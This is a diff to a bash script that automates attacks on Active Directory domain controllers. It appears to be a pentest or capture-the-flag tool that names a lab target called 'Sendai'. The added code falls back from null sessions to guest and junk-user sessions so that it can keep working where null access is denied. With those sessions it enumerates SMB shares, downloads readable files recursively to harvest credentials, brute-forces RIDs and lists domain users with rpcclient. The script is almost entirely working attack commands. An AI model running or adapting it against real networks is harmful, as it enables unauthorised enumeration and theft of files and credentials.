@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.38.0"
+readonly VERSION="1.39.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -163,6 +163,11 @@ IS_DC_ADMIN=0       # 1 when the CURRENT identity is local admin on the DC (Pwn3
 SUDO_KEEPALIVE_PID=""
 # Service capabilities, decided from the port scan — drive which techniques run
 CAP_SMB=0; CAP_KERBEROS=0; CAP_LDAP=0; CAP_LDAPS=0; CAP_RPC=0; CAP_WINRM=0; CAP_ADWS=0; CAP_DNS=0
+# Best anonymous credential for unauthenticated enumeration. A GUEST session (any junk
+# user + blank password, mapped to Guest) is allowed to enumerate shares/RID/SAMR on
+# many hardened DCs where the strict NULL session is denied — so whenever guest is
+# enabled we prefer/also-try it. Set in phase_unauth.
+GUEST_ENABLED=0; ANON_U=""; ANON_P=""
 STEALTH=0           # 1 = skip noisy techniques + add jitter (OPSEC)
 DO_ABUSE=0          # 1 = actually perform ACL/privilege abuse (otherwise report only)
 DEEP_CVE=0          # 1 = run slow/noisy CVE modules such as PrintNightmare
@@ -700,11 +705,25 @@ phase_unauth() {
 
     subsection "SMB: null session & guest"
     run "$NXC smb $DC_IP -u '' -p ''";    $NXC smb "$DC_IP" -u '' -p '' 2>&1 | tee -a "$LOGFILE"
-    run "$NXC smb $DC_IP -u guest -p ''"; $NXC smb "$DC_IP" -u 'guest' -p '' 2>&1 | tee -a "$LOGFILE"
+    run "$NXC smb $DC_IP -u guest -p ''"; local _gt; _gt=$($NXC smb "$DC_IP" -u 'guest' -p '' 2>&1); echo "$_gt" | tee -a "$LOGFILE"
+    # If guest is enabled, prefer it as the anonymous credential everywhere below — it
+    # out-enumerates the null session on hardened DCs (the Sendai case).
+    if grep -qiE '\[\+\][^[]*\\guest:' <<<"$_gt"; then
+        GUEST_ENABLED=1
+        loot "Guest account is ENABLED → trying guest alongside null for anonymous enumeration"
+    fi
 
     subsection "SMB: anonymously accessible shares"
     run "$NXC smb $DC_IP -u '' -p '' --shares"
     local sh; sh=$($NXC smb "$DC_IP" -u '' -p '' --shares 2>&1); echo "$sh" | tee -a "$LOGFILE"
+    # Null denied but guest available → retry as guest (and remember guest as ANON_U
+    # so the share download below uses the session that actually works).
+    if ! grep -qiE 'READ|WRITE' <<<"$sh" && [[ "$GUEST_ENABLED" == "1" ]]; then
+        run "$NXC smb $DC_IP -u guest -p '' --shares   (null denied → guest)"
+        local _shg; _shg=$($NXC smb "$DC_IP" -u guest -p '' --shares 2>&1); echo "$_shg" | tee -a "$LOGFILE"
+        if grep -qiE 'READ|WRITE' <<<"$_shg"; then sh="$_shg"; ANON_U="guest"; ANON_P=""
+            loot "Shares enumerated via GUEST session (null session was denied)"; fi
+    fi
     if echo "$sh" | grep -qiE 'READ|WRITE'; then
         loot "Shares reachable without credentials! saved to loot"
         echo "$sh" >"$OUTDIR/shares_anon.txt"
@@ -718,20 +737,23 @@ phase_unauth() {
     # smbclient recursive download per readable non-default share.
     subsection "Anonymous share looting — download readable files + harvest creds"
     local adl="$OUTDIR/shares_anon"; mkdir -p "$adl"
-    $NXC smb "$DC_IP" -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
+    # Use whichever anonymous session works (guest when enabled, else null) for both nxc
+    # and smbclient — guest reaches shares a null session can't on hardened DCs.
+    local -a _sca; [[ -n "$ANON_U" ]] && _sca=(-U "${ANON_U}%${ANON_P}") || _sca=(-N)
+    $NXC smb "$DC_IP" -u "$ANON_U" -p "$ANON_P" -M spider_plus -o DOWNLOAD_FLAG=true MAX_FILE_SIZE=5242880 \
         EXCLUDE_EXTS=ico,lnk,ini,db,dat,png,jpg,jpeg,gif,bmp,svg,ttf,otf,woff,woff2,eot,exe,dll,msi,sys,mui,cat EXCLUDE_FILTER=ipc$,Default,AppData,WinX,Cache,Crashpad,Packages,Temp,Roaming,desktop.ini,Microsoft \
         OUTPUT_FOLDER="$adl" 2>&1 | tail -15 | tee -a "$LOGFILE"
     if [[ -z "$(find "$adl" -type f ! -name '*.json' 2>/dev/null)" ]] && have smbclient; then
-        info "nxc null-spider pulled nothing → falling back to smbclient recursive download"
+        info "nxc spider pulled nothing → falling back to smbclient recursive download"
         local _shl; _shl=$(printf '%s\n' "$sh" | grep -iE '[[:space:]]READ([[:space:]]|$)' \
             | sed -E 's/^[A-Z]+[[:space:]]+\S+[[:space:]]+[0-9]+[[:space:]]+\S+[[:space:]]+//' | awk '{print $1}')
-        [[ -z "$_shl" ]] && _shl=$(smbclient -L "//$DC_IP" -N 2>/dev/null | awk '/Disk/{print $1}')
+        [[ -z "$_shl" ]] && _shl=$(smbclient -L "//$DC_IP" "${_sca[@]}" 2>/dev/null | awk '/Disk/{print $1}')
         local _s
         while IFS= read -r _s; do
             [[ -z "$_s" ]] && continue
             case "${_s^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON|SHARE|-----|DISK) continue;; esac
             local _d="$adl/$_s"; mkdir -p "$_d"
-            smbclient "//$DC_IP/$_s" -N -c "recurse ON; prompt OFF; lcd \"$_d\"; mget *" >/dev/null 2>&1
+            smbclient "//$DC_IP/$_s" "${_sca[@]}" -c "recurse ON; prompt OFF; lcd \"$_d\"; mget *" >/dev/null 2>&1
         done < <(printf '%s\n' "$_shl" | sort -u)
     fi
     local _af; _af=$(find "$adl" -type f ! -name '*.json' 2>/dev/null)
@@ -766,12 +788,12 @@ phase_unauth() {
     # username (first.last). This is exactly how Sendai leaks its users when RID-brute
     # and RPC are denied. Mine them straight from a recursive share listing.
     if have smbclient; then
-        local _dshl _ds
-        _dshl=$(smbclient -L "//$DC_IP" -N 2>/dev/null | awk '/Disk/{print $1}')
+        local _dshl _ds; local -a _sca2; [[ -n "$ANON_U" ]] && _sca2=(-U "${ANON_U}%${ANON_P}") || _sca2=(-N)
+        _dshl=$(smbclient -L "//$DC_IP" "${_sca2[@]}" 2>/dev/null | awk '/Disk/{print $1}')
         while IFS= read -r _ds; do
             [[ -z "$_ds" ]] && continue
             case "${_ds^^}" in ADMIN\$|C\$|IPC\$|PRINT\$|FAX\$|SYSVOL|NETLOGON) continue;; esac
-            smbclient "//$DC_IP/$_ds" -N -c "recurse ON; ls" 2>/dev/null \
+            smbclient "//$DC_IP/$_ds" "${_sca2[@]}" -c "recurse ON; ls" 2>/dev/null \
                 | grep -E '[[:space:]]D[[:space:]]' | awk '{print $1}'
         done < <(printf '%s\n' "$_dshl" | sort -u) \
             | grep -oiE '^[a-z][a-z0-9-]+\.[a-z][a-z0-9-]+$' \
@@ -784,18 +806,35 @@ phase_unauth() {
     fi
 
     subsection "RID brute force (enumerate users without credentials)"
-    run "$NXC smb $DC_IP -u '' -p '' --rid-brute 4000"
-    local rb; rb=$($NXC smb "$DC_IP" -u '' -p '' --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
-    echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
+    # A plain NULL session (-u '' -p '') is commonly DENIED on hardened DCs (Sendai
+    # returns LSAD STATUS_ACCESS_DENIED), but a GUEST session still allows SAMR RID
+    # cycling — ANY junk username with a blank password is mapped to Guest when guest
+    # access is enabled. Try null first, then guest/junk, and keep whichever returns
+    # users. (This is the exact reason `nxc -u test -p '' --rid-brute` works on Sendai
+    # while `-u ''` does not.)
+    local rb="" _pair _ru _rp _ridok=""
+    for _pair in "_NULL_ _NULL_" "guest _NULL_" "adautopwn _NULL_"; do
+        _ru="${_pair%% *}"; _rp="${_pair##* }"
+        [[ "$_ru" == "_NULL_" ]] && _ru=""; [[ "$_rp" == "_NULL_" ]] && _rp=""
+        run "$NXC smb $DC_IP -u '${_ru}' -p '${_rp}' --rid-brute 4000"
+        rb=$($NXC smb "$DC_IP" -u "$_ru" -p "$_rp" --rid-brute 4000 2>&1); echo "$rb" | tee -a "$LOGFILE"
+        echo "$rb" | grep -i 'SidTypeUser' | grep -oP '\\\K[^ ]+' | sort -u >"$OUTDIR/users_ridbrute.txt"
+        [[ -s "$OUTDIR/users_ridbrute.txt" ]] && { _ridok="$_ru"; break; }
+    done
     if [[ -s "$OUTDIR/users_ridbrute.txt" ]]; then
+        [[ -n "$_ridok" ]] && loot "RID brute worked via GUEST session (-u '${_ridok}' -p '') — null session was denied"
         loot "$(wc -l <"$OUTDIR/users_ridbrute.txt") users via RID brute → users_ridbrute.txt"
         while read -r u; do echo -e "      ${C_GREEN}·${C_RESET} $u"; FOUND_USERS+=("$u"); done <"$OUTDIR/users_ridbrute.txt"
     fi
 
-    subsection "rpcclient: enumdomusers (null session)"
-    run "rpcclient -U '' -N $DC_IP -c enumdomusers"
-    rpcclient -U '' -N "$DC_IP" -c 'enumdomusers' 2>&1 | tee -a "$LOGFILE" \
-        | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
+    subsection "rpcclient: enumdomusers (null / guest session)"
+    # Same null-vs-guest story: fall back to a guest session if the null one is denied.
+    for _pair in "-U '' -N" "-U 'guest%'" "-U 'adautopwn%'"; do
+        run "rpcclient $_pair $DC_IP -c enumdomusers"
+        eval "rpcclient $_pair \"$DC_IP\" -c 'enumdomusers' 2>&1" | tee -a "$LOGFILE" \
+            | grep -oP 'user:\[\K[^\]]+' | sort -u >"$OUTDIR/users_rpc.txt"
+        [[ -s "$OUTDIR/users_rpc.txt" ]] && break
+    done
     [[ -s "$OUTDIR/users_rpc.txt" ]] && loot "Users via rpcclient → users_rpc.txt"
 
     subsection "LDAP: anonymous bind"
